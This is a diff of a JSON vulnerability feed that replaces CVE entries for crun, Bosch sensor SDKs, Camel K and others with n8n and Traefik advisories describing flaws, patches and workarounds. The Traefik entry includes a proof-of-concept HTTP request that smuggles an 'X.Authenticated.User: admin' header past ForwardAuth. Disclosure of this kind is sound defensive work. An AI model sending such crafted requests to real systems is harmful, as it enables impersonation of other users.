-      "summary": "A flaw was found in crun. After pivot_root, reopening /dev/null for stdio can follow a symlink and attach a host file to container stdio, then change that file's ownership. Affected versions are crun 1.29.1 and earlier. Default configurations that mount a fresh /dev are not exposed. No fixed release is available yet.",
-      "cvssScore": 5.4,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88265",
-        "https://access.redhat.com/security/cve/CVE-2026-88265",
-        "https://bugzilla.redhat.com/show_bug.cgi?id=2531224",
-        "https://github.com/containers/crun"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-44950",
-      "summary": "fs_read_glyphs() in the libXfont2 font-server client (src/fc/fserve.c) copies each glyph's bitmap into a single buffer. Existing checks validates only that the source slice (position, length) lies within the source bitmap buffer. It does not check whether the running destination cursor has exceeded the allocation.\n\nA malicious font server can send overlapping source offsets -- for example 1000 glyphs each referencing {position:0, length:64} with nbytes=64. Each individual source range passes the existing validation, but the cumulative writes total 64000 bytes into a 64-byte destination buffer. This is a heap buffer overflow with attacker-controlled content.",
-      "cvssScore": 8.6,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-44950",
-        "https://bugzilla.suse.com/show_bug.cgi?id=CVE-2026-44950"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-80351",
-      "summary": "Improper neutralization of directives in dynamically evaluated code ('eval injection') vulnerability in Apache Camel K.\n\nAn improper neutralization of directives in dynamically evaluated Maven configuration allows tenant-controlled repository content to influence code execution within the operator pod, potentially enabling tenants to execute arbitrary code with the privileges of the operator.\n\nThis issue affects Apache Camel K: from 2.0.0 before 2.9.3, from 2.10.1 before 2.10.2.\n\nUsers are recommended to upgrade to version 2.9.3, 2.10.2 or 2.11.0, which fixes the issue.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-80351",
-        "https://camel.apache.org/security/CVE-2026-80351.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-42806",
-      "summary": "An out-of-bounds read vulnerability was discovered in the Bosch BME690 SensorAPI (C-driver) in version v1.0.3 and prior, specifically within the field data parsing logic in read_all_field_data (bme69x.c).\n\nThe driver prefetches heater configuration registers into a contiguous 30-byte stack buffer (set_val) mapping IDAC, RES_HEAT, and GAS_WAIT tables.\n\nWhen parsing sensor field data, the gas_index is extracted using a 4-bit mask (0..15) but lacks boundary verification against the valid range (0..9).\n\nAn attacker or a compromised peripheral mimicking a sensor on the I2C/SPI bus could return a payload with a gas index value of 10 or higher.\n\nThis causes the driver to perform an out-of-bounds array access (set_val[20 + gas_index]), reading up to 6 bytes past the stack buffer.\n\nThe leaked out-of-bounds byte is then written into the public gas_wait field, which may lead to measurement corruption or leak adjacent stack memory when telemetered or logged.",
-      "cvssScore": 3.4,
-      "severity": "Low",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-42806",
-        "https://psirt.bosch.com/security-advisories/BOSCH-SA-223618.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-80352",
-      "summary": "Improper Control of Generation of Code ('Code Injection') vulnerability in Apache Camel K.\n\nA YAML injection vulnerability in custom resource configuration allows an authorized CR author to inject arbitrary Kubernetes objects, potentially enabling unauthorized resource creation with the privileges of the operator.\n\nThis issue affects Apache Camel K: from 2.0.0 before 2.9.3, from 2.10.1 before 2.10.2.\n\nUsers are recommended to upgrade to version 2.9.3, 2.10.2 or 2.11.0, which fixes the issue.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-80352",
-        "https://camel.apache.org/security/CVE-2026-80352.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88770",
-      "summary": "A flaw was found in the Device Authorization Grant flow of Keycloak, an identity and access management solution. The issue occurs because the token redemption process fails to check if a user account is currently locked due to brute-force protection. If an attacker has an active session for a locked account, they can complete the device login process and receive new security tokens. This allows the attacker to maintain access to the account even when it should be temporarily disabled to prevent unauthorized entry.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88770",
-        "https://access.redhat.com/security/cve/CVE-2026-88770",
-        "https://bugzilla.redhat.com/show_bug.cgi?id=2531302"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-42808",
-      "summary": "An issue was discovered in Bosch Sensortec COINES_SDK versions 2.0 through 2.11. \n\nThe host streaming API function {{coines_read_stream_sensor_data()}} fails to validate the boundaries of the caller-provided destination buffer.\n\nInternally, the stream processing mechanism in {{comm_intf_process_stream_response()}} discards the requested {{number_of_samples}} argument and copies the entirety of the streaming ring buffer's accumulated data into {{coines_stream_rsp_buf}}.\n\nSubsequently, {{coines_read_stream_sensor_data()}} unconditionally executes a {{memcpy}} of the ring buffer size into the caller-provided buffer without verifying if the destination memory allocation is large enough.\n\nA malicious or compromised hardware board connected via USB or BLE can exploit this by streaming a high volume of sensor samples, causing a heap or stack-based buffer overflow on the host desktop environment.\n\nThis can result in a Denial of Service (DoS) or potential arbitrary code execution on the host machine.",
+      "id": "CVE-2026-86085",
+      "summary": "## Impact\n\nThe endpoints `/rest/roles/:slug/assignments` and `/rest/roles/:slug/assignments/:projectId/members` checked only that the caller could manage the role type, not that they could see the project named in the request. A user holding role-management permission could therefore name any project on the instance and read back its members' names and email addresses. The patch adds a project-access check to both routes, hiding projects the caller cannot see and returning not-found for a project it cannot list.\n\n## Patches\n\nThe issue has been fixed in n8n versions 2.38.2 and 2.37.7. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Audit and revoke any custom global roles that carry the `role:manageProject` scope, limiting that scope to fully trusted users only.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
       "cvssScore": 5.1,
       "severity": "Medium",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-42808",
-        "https://psirt.bosch.com/security-advisories/BOSCH-SA-223618.html"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-cqr2-h44g-v75v",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86085",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2",
+        "https://github.com/advisories/GHSA-cqr2-h44g-v75v"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-42807",
-      "summary": "A heap-based buffer overflow vulnerability in the PC bridge protocol decoder of BoschSensortec COINES_SDK (versions 2.10 through 2.12.2) allows attackers to cause a denial of service (process crash) or potentially execute arbitrary code. \n\nThe bridge decoder ({{bridge_decoder.c}}) trusts the packet length field provided by the external device and forwards it to the host response queue ({{mqueue_add_data}}) without validating the bounds of the destination buffer. \n\nA malicious or compromised USB or Bluetooth Low Energy (BLE) peripheral can advertise a payload size up to ~3 KB, which exceeds the default queue slot size of 255 bytes. \n\nThis results in an unbounded heap overwrite ({{memcpy}}), corrupting adjacent heap metadata on the host system when processing the device's response.",
+      "id": "CVE-2026-86993",
+      "summary": "## Impact\n\nA log streaming event destination may reference a generic HTTP credential, and the destination resolved and decrypted whichever credential it named without checking that the caller had access to it. A user holding a custom global role scoped to Log Streaming operations could therefore name a credential belonging to another project and have its decrypted secret sent to an endpoint they controlled. The patch applies the standard credential access check when a destination resolves its credential.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Audit and revoke any custom global roles that carry Log Streaming scopes (`eventBusDestination:create`, `eventBusDestination:test`, etc.), limiting those scopes to fully trusted users only.\n- Review existing Log Streaming event destinations for unexpected webhook URLs and remove any that are not recognized, then rotate any credentials that may have been referenced.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 5.9,
+      "severity": "Medium",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      },
+      "references": [
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-pq6c-vh67-xpm3",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86993",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2"
+      ],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-86084",
+      "summary": "## Impact\n\nThe public OIDC login and callback endpoints ran the full flow whether or not OIDC was the instance's active, enabled authentication method, so turning OIDC off in Settings did not stop it issuing sessions. An administrator who disabled the provider still had a working login route. The patch requires OIDC to be the enabled, active authentication method before either endpoint starts the flow or issues a session.\n\nThe issue affects n8n Enterprise instances where OIDC was configured at least once and subsequently disabled.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Disable or revoke the corresponding application or client at the IdP level to prevent the OIDC flow from completing.\n- Restrict network-level access to the n8n instance to trusted users only.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 6,
+      "severity": "Medium",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-288",
+        "name": "Authentication Bypass Using an Alternate Path or Channel"
+      },
+      "references": [
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-pf83-w3f9-8m37",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86084",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2"
+      ],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-86080",
+      "summary": "## Impact\n\nThe GitHub Trigger generated a signing secret when it registered a webhook and verified `X-Hub-Signature-256` on each delivery. When GitHub answered the create request with a 422 because a webhook for the URL already existed, the node adopted the remote hook but kept only its id and events, discarding the secret it had generated. Deliveries to that workflow's webhook URL were then accepted from anyone. The patch re-fetches the existing hook by its stored id, re-applies the signing secret, and makes verification fail closed when no secret is stored.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Deactivate and reactivate any GitHub Trigger workflows to force a fresh webhook registration with a new secret, provided the remote GitHub hook has been deleted first so that the 422 reuse path is not taken again.\n- Restrict network access to the n8n webhook endpoint to GitHub's published IP ranges only.\n- Audit GitHub Trigger workflow static data for entries that contain a `webhookId` but no `webhookSecret`, and treat those workflows as unprotected until reactivated successfully.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
       "cvssScore": 6.3,
       "severity": "Medium",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-347",
+        "name": "Improper Verification of Cryptographic Signature"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-42807",
-        "https://psirt.bosch.com/security-advisories/BOSCH-SA-223618.html"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-5m98-cgcr-xx3q",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86080",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-88763",
-      "summary": "A flaw was found in the skupper-router component of Red Hat Service Interconnect, which is used to provide secure communication between distributed services. The issue occurs when the router processes a specially crafted network message using its AMQP field parser. Due to a lack of bounds on recursion during parsing, the router can run out of stack memory and crash, leading to a denial of service for the interconnected network.",
-      "cvssScore": 7.4,
+      "id": "CVE-2026-86079",
+      "summary": "## Impact\n\nThe Elasticsearch and ElasticSecurity nodes built REST endpoints by interpolating user-provided identifiers straight into the request path. A value containing path separators or dot segments changed which endpoint the request actually reached, so an operation intended for one document could hit another index or a cluster administration endpoint instead, under the stored Elasticsearch credential. The patch encodes each identifier as a single URL path segment and rejects values that normalise away.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Disable the affected nodes by adding `n8n-nodes-base.elasticsearch` and `n8n-nodes-base.elasticSecurity` to the `NODES_EXCLUDE` environment variable if they are not required.\n- Audit existing workflows that use these nodes and ensure that index and document identifier fields do not accept externally-controlled input.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 6.3,
+      "severity": "Medium",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
+      "references": [
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-f2cp-m7mv-8jpv",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86079",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2"
+      ],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-86078",
+      "summary": "## Impact\n\nThe Instance AI workflow summary built its result with get-or-create-then-nested-write idioms keyed by node names and connection keys taken from the stored workflow. Those are arbitrary strings: the restricted-name guard n8n shows in the editor is client-side and is bypassed by posting the workflow to the REST API directly. So a reserved key such as `__proto__` resolved up the prototype chain instead of creating an own key, and the write landed on `Object.prototype` in the main n8n process, affecting every later request. The patch builds the summary with null-prototype accumulators and validates the keys it accepts, so reserved names cannot reach the prototype chain.\n\n## Patches\n\nThe issue has been fixed in n8n versions 2.37.7 and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Remove or leave unconfigured the `N8N_INSTANCE_AI_MODEL*` environment variables to prevent the Instance AI module from reaching the vulnerable code path.\n- Restart the n8n process to clear any in-memory prototype pollution if an attack is suspected.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 6,
+      "severity": "Medium",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-1321",
+        "name": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+      },
+      "references": [
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-679f-58pq-4v2c",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86078",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2",
+        "https://github.com/advisories/GHSA-679f-58pq-4v2c"
+      ],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-86994",
+      "summary": "## Impact\n\nThe endpoint `/rest/active-workflows` returned every active workflow ID on the instance to any member, regardless of sharing, and workflow activation, deactivation and publication push events were broadcast to every connected client, carrying workflow IDs, version IDs and activation-error detail across users. The patch scopes both the listing and the push events through the sharing service, so a user only sees workflows they can access.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Avoid provisioning `global:member` accounts for untrusted users until the instance is patched.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      },
+      "references": [
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-65xw-2v52-jhxc",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86994",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2"
+      ],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-86083",
+      "summary": "## Impact\n\nTwo stages of expression code generation built source text by calling the global `JSON.stringify` at generation time: the compiler when printing synthetic string literals, and the isolate bridge when interpolating a timezone value into its per-evaluation wrapper. An expression that replaced that global therefore changed the code that was subsequently generated and executed, turning literal data into executable source. The patch renders both code-generation stages through a reference captured at module load, so a later change to global state cannot alter the generated source.\n\nThis vulnerability only affects instances running the legacy expression engine. The `vm` expression engine, which is the default on the patched releases, is not affected.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Set the environment variable `N8N_EXPRESSION_ENGINE=vm` to switch to the vm expression engine, which is not affected by this vulnerability.\n- Restrict n8n instance access to fully trusted users only.\n- Ensure the n8n process runs under a dedicated low-privilege OS user account to limit the impact of any command execution.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 7.7,
       "severity": "High",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88763",
-        "https://access.redhat.com/security/cve/CVE-2026-88763",
-        "https://bugzilla.redhat.com/show_bug.cgi?id=2531301"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-6xcw-7xm6-48c6",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86083",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-42805",
-      "summary": "A stack-based buffer overflow vulnerability exists in the Bosch Sensortec BHI385 SensorAPI (C library) within the debug message parser function bhi385_parse_debug_message (located in bhi385_parse.c). \n\nThe function parses FIFO events and extracts an 8-bit message length directly from the attacker-controlled event payload (callback_info->data_ptr[0]) without enforcing bounds checks or clamping the value.\n\nWhen copying the payload into a fixed-size stack buffer of 17 bytes (uint8_t debug_msg[17]) via memcpy, providing a length byte greater than 16 causes the function to write past the allocated stack boundary. \n\nThis memory corruption can be triggered by a malicious or compromised sensor or bus participant, leading to a firmware crash, Denial of Service (DoS), or potentially the execution of arbitrary code via adjacent stack data corruption.",
-      "cvssScore": 6.7,
+      "id": "CVE-2026-86077",
+      "summary": "## Impact\n\nThe `/chat` WebSocket route resumed a paused execution from a resume token without checking that the node being resumed was a chat node. n8n hands that token to anonymous form submitters, so a party with no account could present it on the chat route and release an execution waiting at an approval gate, the control an author puts in front of an action considered too consequential to automate. The patch restricts resume over the chat route and Chat Hub to chat-capable node types.\n\n## Patches\n\nThe issue has been fixed in n8n versions 2.37.7 and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Avoid workflows that combine a Form Trigger with non-chat approval gates (Send-and-Wait, Telegram/Slack/Gmail HITL, or plain Wait nodes) on publicly accessible instances.\n- Audit recent executions of such workflows for unexpected completion without a corresponding approval callback.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 6.3,
       "severity": "Medium",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-42805",
-        "https://psirt.bosch.com/security-advisories/BOSCH-SA-223618.html"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-35jj-42hp-8gmq",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86077",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2",
+        "https://github.com/advisories/GHSA-35jj-42hp-8gmq"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-42804",
-      "summary": "A stack-based buffer overflow vulnerability exists in the Bosch Sensortec BHI360 SensorAPI(C-Library) in versions up to and including commit d6b200416a.\n\nThe vulnerability is located within the FIFO parsing and debug logging subsystem inside the function bhi360_parse_debug_message() in bhi360_parse.c (lines 1852-1875). \n\nThe parser trusts the first payload byte of a debug frame as the message length (msg_length) and copies that many bytes into a fixed-size 17-byte stack buffer (debug_msg) via memcpy without performing any bounds checking.\n\nA locally or physically positioned attacker (e.g., via a malicious sensor, counterfeit hardware module, or a Man-in-the-Middle on the communication bus) can exploit this vulnerability by injecting a crafted debug frame with a length byte exceeding 16.\n\nThis corrupts adjacent stack data, including the saved return address.\n\nFurthermore, because the overflowed buffer is subsequently passed to a printf-style logging sink, the attacker can supply format string specifiers (e.g., %n) to execute arbitrary code on the host microcontroller/SoC or cause a reliable system crash (Denial of Service).",
-      "cvssScore": 6.1,
+      "id": "CVE-2026-88011",
+      "summary": "## Summary\n\nThere is a medium severity vulnerability in Traefik's handling of request headers whose name aliases another header name. Go canonicalizes header names on dashes only, so `X-Auth-User`, `X_Auth_User` and `X.Auth.User` are three distinct headers to Traefik, while backends that derive variable names from header names (CGI, WSGI, PHP, NGINX, and others) collapse all of them into the same variable. A client can therefore smuggle an alias of a header that Traefik manages past the middleware managing it — for example a dot-form `X.Authenticated.User` alongside the canonical `X-Authenticated-User` written by the ForwardAuth middleware — and have such a backend read the client-supplied value instead of the identity Traefik asserted. Any header Traefik sets is exposed, not only ForwardAuth's. This is an incomplete-fix sibling of GHSA-x677-9fxg-v5c5, which blocked only the underscore form.\n\nThe mitigation is the new `aliasHeadersStrategy` entry point option. It defaults to `keep`, which preserves the previous behavior for backwards compatibility, so it must be explicitly set to `delete` or `reject` to take effect.\n\nTraefik v1.x, the v2 releases up to v2.11.55 and the v3 releases from v3.0.0 to v3.7.11 are affected. The unmaintained lines among them will not receive a patch of their own, and the remedy for their users is to upgrade to v2.11.56 or v3.7.12 and set `aliasHeadersStrategy`.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.56\n- https://github.com/traefik/traefik/releases/tag/v3.7.12\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original Description</summary>\n\n### Summary\nTraefik's ForwardAuth middleware removes the configured canonical identity header before copying the value returned by the auth service. However, a client-supplied dot-form alias such as `X.Authenticated.User` survives both this replacement and `underscoreHeadersStrategy: delete`.\n\nThe tested PHP 8.2 built-in SAPI maps `X-Authenticated-User` and `X.Authenticated.User` to the same `HTTP_X_AUTHENTICATED_USER` server variable. In Traefik's tested HTTP/1 backend path, the client value is serialized last and overrides the identity asserted by ForwardAuth.\n\nA client whom ForwardAuth permits as a lower-privilege identity can therefore be treated by the backend as another user or role.\n\n### Details\nAt `v3.7.10`, `pkg/server/server_entrypoint_tcp.go:800-818` removes or rejects only names containing `_`. After successful authentication, `pkg/middlewares/auth/forward.go:314-326` deletes and replaces only the canonical `authResponseHeaders` key. The dot alias remains in `req.Header` and the standard reverse proxy forwards both legal field names.\n\nGo's HTTP/1 writer sorts header names lexically, placing `X-Authenticated-User` before `X.Authenticated.User`. PHP then collapses both into one `$_SERVER` key, so the attacker value deterministically wins.\n\nThis is an incomplete-fix sibling of `GHSA-x677-9fxg-v5c5`: the published underscore input is blocked by the new entry-point strategy, while the dot input bypasses that mitigation on the current stable release.\n\n### PoC\n[traefik-dot-forwardauth-poc.zip](https://github.com/user-attachments/files/30898195/traefik-dot-forwardauth-poc.zip)\n\nrun:\n```bash\ndocker compose up -d\nbash verify.sh\ndocker compose down\n```\n\nThe decisive request is:\n\n```http\nGET /probe HTTP/1.1\nHost: 127.0.0.1:18080\nX.Authenticated.User: admin\nConnection: close\n```\n\nExpected backend identity: `lab-user`, as returned by ForwardAuth.\n\nObserved on `v3.7.10`: `admin`.\n\nThe script also verifies that requests without the alias, with the canonical header, and with the already-fixed underscore alias all produce `lab-user`.\n\n### Impact\nApplications that authorize requests using a ForwardAuth-provided identity header can receive an attacker-selected username or role instead. This was runtime-verified with PHP 8.2.27 and 8.2.33; impact on other normalization-prone backends is conditional. A lower-privilege permitted client may consequently impersonate another user or administrative role, affecting confidentiality and integrity.\n\nThis report does not claim bypass of a ForwardAuth denial: the auth service must first permit the request.\n\n</details>",
+      "cvssScore": 5.3,
       "severity": "Medium",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-290",
+        "name": "Authentication Bypass by Spoofing"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-42804",
-        "https://psirt.bosch.com/security-advisories/BOSCH-SA-223618.html"
+        "https://github.com/traefik/traefik/security/advisories/GHSA-rf44-j88r-hh8c",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88011",
+        "https://github.com/traefik/traefik/pull/13720",
+        "https://github.com/traefik/traefik/commit/0331801c72329e0eaeb850e53ccce87c57fbecf8",
+        "https://github.com/traefik/traefik/releases/tag/v2.11.56"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "github.com/traefik/traefik/v2 go",
+        "github.com/traefik/traefik/v3 go"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-80354",
-      "summary": "Authorization bypass through User-Controlled key vulnerability in Apache Camel K.\n\nAn authorization vulnerability in custom resource resolution allows a tenant to reference secrets by name in the operator namespace, potentially exposing secrets belonging to other tenants or operator components.\n\nThis issue affects Apache Camel K: from 2.0.0 before 2.9.3, from 2.10.1 before 2.10.2.\n\nUsers are recommended to upgrade to version 2.9.3, 2.10.2 or 2.11.0, which fixes the issue.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-80354",
-        "https://camel.apache.org/security/CVE-2026-80354.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-13745",
-      "summary": "A vulnerability in the Gemini CLI and associated GitHub Action allowed an unprivileged attacker to achieve an arbitrary code execution in Gemini CLI via untrusted local .env files overriding GEMINI_CLI_HOME.",
-      "cvssScore": null,
-      "severity": "Critical",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://github.com/google-github-actions/run-gemini-cli/security/advisories/GHSA-wpqr-6v78-jr5g",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-13745",
-        "https://github.com/google-github-actions/run-gemini-cli/releases/tag/v0.1.22"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-19840",
